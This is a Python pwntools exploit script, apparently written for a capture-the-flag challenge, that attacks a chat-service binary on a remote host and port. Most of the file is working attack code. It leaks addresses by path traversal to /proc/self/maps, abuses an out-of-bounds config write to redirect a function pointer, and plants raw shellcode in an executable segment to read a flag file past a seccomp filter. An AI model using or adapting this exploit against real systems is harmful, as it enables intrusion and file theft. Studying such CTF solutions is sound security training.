#!/usr/bin/python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './services' # <-- change this
elf = context.binary = ELF(exe, checksec=True)
libc = './libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'info'
context.terminal = ["tmux", "splitw", "-h"]
host, port = '139.59.120.240', 13372 # <-- change this

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
break *main
break *backupMessages
break *backupMessages+53
'''.format(**locals())


# =========================================================
#                         NOTES
# =========================================================

# chatservice main !1 ?3 ❯ seccomp-tools dump ./services
#  line  CODE  JT   JF      K
# =================================
#  0000: 0x20 0x00 0x00 0x00000004  A = arch
#  0001: 0x15 0x00 0x09 0xc000003e  if (A != ARCH_X86_64) goto 0011
#  0002: 0x20 0x00 0x00 0x00000000  A = sys_number
#  0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
#  0004: 0x15 0x00 0x06 0xffffffff  if (A != 0xffffffff) goto 0011
#  0005: 0x15 0x05 0x00 0x00000038  if (A == clone) goto 0011
#  0006: 0x15 0x04 0x00 0x00000039  if (A == fork) goto 0011
#  0007: 0x15 0x03 0x00 0x0000003a  if (A == vfork) goto 0011
#  0008: 0x15 0x02 0x00 0x0000003b  if (A == execve) goto 0011
#  0009: 0x15 0x01 0x00 0x00000142  if (A == execveat) goto 0011
#  0010: 0x06 0x00 0x00 0x7fff0000  return ALLOW
#  0011: 0x06 0x00 0x00 0x00000000  return KILL

# 1000 wide rwxp address segment

def read_chat(data):
    io.sendlineafter(b':\n', b'1')
    io.sendlineafter(b':\n', str(data).encode())

def update_config(idx, data):
    io.sendlineafter(b':\n', b'2')
    io.sendlineafter(b':\n', str(idx).encode())
    io.sendlineafter(b': \n', flat(data))

def backup():
    io.sendlineafter(b':', b'3')

# =========================================================
#                         EXPLOITS
# =========================================================
def exploit():
    global io
    io = initialize()
    rop = ROP(exe)
    
    # get info leak
    read_chat('../../../../../../../proc/self/maps')
    elf.address = int(io.recvline().split(b'-')[0], 16)
    
    while True:
        # get rwxp segment leak
        leak = io.recvline().strip()
        if b'rwxp' in leak:
            rwxp = int(leak.split(b'-')[0], 16)
            break
    
    # important addresses    
    success(f'ELF base: {hex(elf.address)}')
    success(f'Config address: {hex(elf.symbols["config"])}')
    success(f'backupCall address: {hex(elf.symbols["backupCall"])}')
    success(f'RWXP base: {hex(rwxp)}')
    
    # find offset to the backup = 1 thingy, at index 16
    offset = ((elf.symbols['config'] + 16) - elf.symbols['config']) // 8
    
    # write "backup: 1" to index 16, already exist in binary
    update_config(offset, p64(next(elf.search(b'backup: 1'))))
    
    # find offset from config to backupCall
    offset = (elf.symbols['backupCall'] - elf.symbols['config']) // 8
    
    # write addr of rwxp segment to config
    update_config(offset, p64(rwxp))
    
    # find offset to rwxp segment from config
    offset = (rwxp - elf.symbols['config']) // 8 # 8 bytes per config entry
    success(f'Offset: {offset}')
    
    # catting instead (or openfile syscall)
    # shellcode = asm(shellcraft.amd64.linux.cat(b'/home/ctf/flag'))
    shellcode = b'H\xb8\x01\x01\x01\x01\x01\x01\x01\x01PH\xb8g.gm`f\x01\x01H1\x04$H\xb8/home/ctPj\x02XH\x89\xe71\xf6\x0f\x05A\xba\xff\xff\xff\x7fH\x89\xc6j(Xj\x01_\x99\x0f\x05'
    
    # write shellcode to rwxp segment, 8 bytes at a time
    for i in range(0, len(shellcode), 8):
        update_config(offset + i//8, shellcode[i:i+8])
    
    backup()
    
    io.interactive()
    
if __name__ == '__main__':
    exploit()